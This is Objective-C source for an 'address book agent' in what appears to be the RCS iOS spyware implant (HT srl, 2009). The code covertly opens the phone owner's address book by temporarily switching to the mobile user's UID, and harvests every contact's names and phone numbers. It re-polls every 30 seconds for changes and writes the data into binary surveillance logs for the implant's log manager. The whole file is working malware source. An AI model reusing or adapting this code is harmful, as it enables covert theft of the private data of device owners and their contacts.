/*
 * RCSiOS - messages agent
 *
 *
 * Created by Massimo Chiodini on 12/12/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import <sys/types.h>
#import <pwd.h>

#import "RCSIAgentAddressBook.h"

//#define DEBUG

NSString *kRCSIAgentAddressBookRunLoopMode = @"kRCSIAgentAddressBookRunLoopMode";

typedef struct _Names {
#define   CONTACTNAME    0xC025  
  int     magic;  
  int     len;
  //wchar_t buffer[1];
} Names;

typedef struct _ABNumbers {
#define   CONTACTNUM    0xC024  
  int     magic;
  int     type;
  //Names   number;
} ABNumbers;

typedef struct _ABContats {
#define   CONTACTCNT    0xC023 
  int         magic;
  int         numContats;
  //ABNumbers contact[1];
} ABContats;

typedef struct _ABFile {
#define     CONTACTFILE 0xC022  
  int       magic;
  int       len;
  //Names      first;
  //Names      last;
  //ABContacts contact[1];
} ABFile;

typedef struct _ABLogStrcut {
#define   CONTACTLIST   0xC021
  int     magic;
  int     len;
  int     numRecords;
  //ABFile  file[1];
} ABLogStrcut;

#define ALL_ADDRESS (NSTimeInterval)0
#define CFRELEASE(x) {if(x!=NULL)CFRelease(x);}

@interface RCSIAgentAddressBook (hidden)

- (int)_incSemaphore;
- (int)_decSemaphore;
- (BOOL)_getAgentABProperty;
- (BOOL)_setAgentABProperty;
- (BOOL)_writeABLog: (NSMutableArray *)records;
- (BOOL)_getABWithDateTime: (CFAbsoluteTime)dateTime;

@end

// AB Notification callback
static void  ABNotificationCallback(ABAddressBookRef addressBook,
                                    CFDictionaryRef info,
                                    void *context) 
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSIAgentAddressBook *agentAB = (RCSIAgentAddressBook *) context;
  
  [agentAB _incSemaphore];
  
  [pool release];

  return; 
}

@implementation RCSIAgentAddressBook (hidden)

- (int)_incSemaphore
{
  @synchronized(self)
  {
    if (abChanges == 0)
      abChanges++;
  }
  
  return abChanges;
}

- (int)_decSemaphore
{
  @synchronized(self)
  {
    if (abChanges > 0)
      abChanges--;
  }
  
  return abChanges;
}

- (BOOL)_setAgentABProperty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *number = [[NSNumber alloc] initWithDouble: mLastABDateTime];
  NSDictionary *abDict      = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
                                                            forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", nil]];
  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: abDict, nil]
                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [abDict release];
  [number release]; 
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentABProperty
{
  NSDictionary *agentDict = nil;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  agentDict = rcsPropertyWithName([[self class] description]);
  
  if (agentDict == nil) 
    {
      mLastABDateTime = 0;
    }
  else 
    {
      mLastABDateTime = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
      [agentDict release];
    }

  [outerPool release];
  
  return YES;
}

- (ABAddressBookRef)_getAddressBookRef
{
  int               eUid;
  ABAddressBookRef  addressBook;
  
  eUid = geteuid();
  
  if( seteuid(501) < 0)
    {
      return NULL;  
    }

  addressBook = ABAddressBookCreate();
  
  if( seteuid(eUid) < 0)
    {
      CFRELEASE(addressBook);
      return NULL;
    }
  
  return addressBook;
}

- (BOOL)_writeABLog: (NSMutableArray *)records
{
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST;
  abFile.magic    = CONTACTFILE; 
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = [records count];
  header.len        = 0xFFFFFFFF;
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  for (int i=0; i< [records count]; i++) 
    {
      NSDictionary *rec   = (NSDictionary *) [records objectAtIndex: i];
    
      NSString *firstN    = [rec objectForKey: @"First"];
      NSString *lastN     = [rec objectForKey: @"Last"];
      NSMutableArray *num = [rec objectForKey: @"Numbers"];
      
      // New contact
      abFile.len   = 0;
      [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
      
      // FirstName abNames
      abNames.len = [firstN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
                   length: abNames.len];
      
      // LastName abNames
      abNames.len = [lastN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] 
                   length: abNames.len];
      
      // Telephone numbers
      abContat.numContats = [num count];
      [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
      
      for (int a=0; a < [num count]; a++) 
        {
          NSDictionary *telNum = [num objectAtIndex: a];
          
          abNumber.type = a;
          [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
        
          NSString *number = [telNum objectForKey: @"Number"];
          abNames.len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
          [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
                       length: abNames.len];
        }
    }
  
  // Setting len of NSData - sizeof(magic)
  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
  

  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0];

  if (success == TRUE)
    {
      if ([logManager writeDataToLog: abData
                            forAgent: LOG_ADDRESSBOOK
                           withLogID: 0] == TRUE)
        {
          [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
        }
    }
  else
    return NO;

  return YES;
}

- (NSMutableArray*)getABNumbers:(ABMutableMultiValueRef)multi
{
  NSMutableArray  *numbers = nil;
  CFStringRef     phoneNumber, phoneNumberLabel;
  NSDictionary    *telNum;
  
  numbers = [[NSMutableArray alloc] initWithCapacity: 0];
  
  for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
    {
      phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
      if (phoneNumberLabel == NULL) 
        continue;
    
      phoneNumber = ABMultiValueCopyValueAtIndex(multi, i);
      
      if (phoneNumber == NULL) 
        {
          CFRELEASE(phoneNumberLabel);
          continue;
        }
    
      telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (id)phoneNumberLabel, 
                                                             @"Label", 
                                                             phoneNumber, 
                                                             @"Number", nil]; 
      [numbers addObject: telNum];
      
      [telNum release];
      CFRELEASE(phoneNumberLabel);
      CFRELEASE(phoneNumber);
    }
  
  return numbers;
}

- (ABMutableMultiValueRef)getPhones:(ABRecordRef)person
{
  ABMutableMultiValueRef multi;
  
  multi = ABRecordCopyValue(person, kABPersonPhoneProperty);
  
  if (multi == NULL)
    {
      ABRecordID uid = ABRecordGetRecordID(person);
    
      if (uid == kABRecordInvalidID)
        return multi;
        
      ABAddressBookRef addressBook = [self _getAddressBookRef];
     
      if (addressBook == NULL)
        return multi;
    
      ABRecordRef tmpPerson = ABAddressBookGetPersonWithRecordID(addressBook, uid);
      multi = ABRecordCopyValue(tmpPerson, kABPersonPhoneProperty);
    }
  
  return multi;
}

- (NSMutableArray*)getABContacts:(CFArrayRef)people
                    withDateTime:(CFAbsoluteTime)dateTime
{
  static CFStringRef  nullName = CFSTR("");
  
  CFIndex         count;
  CFDateRef       cfDateTime;
  CFAbsoluteTime  currDateTime, lMaxDateTime = dateTime;
  CFStringRef     firstName, lastName;
  NSDictionary    *rec;
  
  ABMutableMultiValueRef  multi;
  
  if ([self isThreadCancelled] == YES)
    return nil;
  
  if ((count = CFArrayGetCount(people)) == 0)
    return nil;
  
  NSMutableArray *abRecords = [[NSMutableArray alloc] initWithCapacity:0];
    
  for (int i=0; i<count; i++) 
    {
      ABRecordRef person = CFArrayGetValueAtIndex(people, i);
      
      if (person != NULL && ABRecordGetRecordType(person) == kABPersonType) 
        {
          firstName     = ABRecordCopyValue(person, kABPersonFirstNameProperty);
          lastName      = ABRecordCopyValue(person, kABPersonLastNameProperty); 
          multi         = [self getPhones:person];
          cfDateTime    = ABRecordCopyValue(person, kABPersonModificationDateProperty);
          
          if (cfDateTime != NULL)
            {
              currDateTime = CFDateGetAbsoluteTime(cfDateTime);
            }
          else 
            { 
              CFRELEASE(firstName);
              CFRELEASE(lastName);
              CFRELEASE(multi);
              continue;
            }
        
          if (((lastName != NULL || firstName != NULL) && multi != NULL)  && 
              (dateTime == ALL_ADDRESS || currDateTime > dateTime))
            {
              if (currDateTime > lMaxDateTime)
                lMaxDateTime = currDateTime;
              
              NSMutableArray *numbers = [self getABNumbers:multi];
              
              NSArray *objects = 
                [NSArray arrayWithObjects:(firstName != NULL ? (id)firstName : (id)nullName), 
                                          (lastName  != NULL ? (id)lastName  : (id)nullName),
                                          numbers,  
                                          nil];
              
              NSArray *keys = [NSArray arrayWithObjects: @"First", 
                                                         @"Last", 
                                                         @"Numbers", 
                                                         nil];
              
              rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
              
              [abRecords addObject: rec];
              
              [numbers release];
              [rec release];
            }
          
          CFRELEASE(firstName);
          CFRELEASE(lastName);
          CFRELEASE(multi);
          CFRelease(cfDateTime);
        }
    }
  
  if (mLastABDateTime < lMaxDateTime) 
    {
      mLastABDateTime = lMaxDateTime;
      [self _setAgentABProperty];
    }
  
  return abRecords;
}

- (BOOL)_getABWithDateTime:(CFAbsoluteTime)dateTime
{
  CFArrayRef        people;
  ABAddressBookRef  addressBook;

  if ([self isThreadCancelled] == YES)
    return NO;

  addressBook = [self _getAddressBookRef];
  
  if (addressBook == NULL) 
    return NO;

  
  if (ABAddressBookHasUnsavedChanges(addressBook) == YES)
      return YES;

  people = ABAddressBookCopyArrayOfAllPeople(addressBook);
  
  CFRELEASE(addressBook);
  
  if (people == NULL || [self isThreadCancelled] == YES) 
      return NO;

  NSMutableArray *abRecords = [self getABContacts:people withDateTime:dateTime];

  if ([abRecords count]) 
    [self _writeABLog: abRecords];
  
  CFRELEASE(people);
  
  [abRecords release];

  return YES;
}

- (void)getABWithDateTime:(NSTimer*)theTimer
{  
  [self _getABWithDateTime: mLastABDateTime];
}

@end

@implementation RCSIAgentAddressBook

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData *)aData
{
  self = [super initWithConfigData: aData];
  
  if (self != nil)
    {
      mLastABDateTime = 0;
      abChanges = 0;
      mAgentID = AGENT_ADDRESSBOOK;
    }
 
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

#define CHANGE_TIME 30

- (void)setABPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getABWithDateTime:) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentAddressBookRunLoopMode];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  if ([self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
      [outerPool release];
      return;
    }
  
  [self _getAgentABProperty];

  ABAddressBookRef addressBook = [self _getAddressBookRef];
  
  if (addressBook == NULL) 
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];  
      [outerPool release];
      return;
    }
 
  if(mLastABDateTime == ALL_ADDRESS)
    [self _getABWithDateTime: ALL_ADDRESS];
    
  [self setABPollingTimeOut: CHANGE_TIME];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
              
      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentAddressBookRunLoopMode 
                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];

      [innerPool release];
    }
  
  CFRELEASE(addressBook);
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self cancelThread];
  [self setMAgentStatus: AGENT_STATUS_STOPPING];  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
